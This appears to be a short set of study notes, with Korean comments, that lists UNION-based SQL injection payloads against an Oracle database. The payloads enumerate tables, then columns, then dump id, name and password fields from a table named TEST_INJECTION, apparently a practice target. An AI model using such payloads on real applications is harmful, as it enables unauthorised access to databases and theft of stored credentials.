select* from tab;

--테이블명
aaa' union select tname,'0','0','0','0' from tab --

--컬럼명
aaa' union select column_name, data_type,'0','0','0' from user_tab_cols where table_name = 'TEST_INJECTION' --

--데이터
aaa' union select id, name,pass,'0','0' from TEST_INJECTION --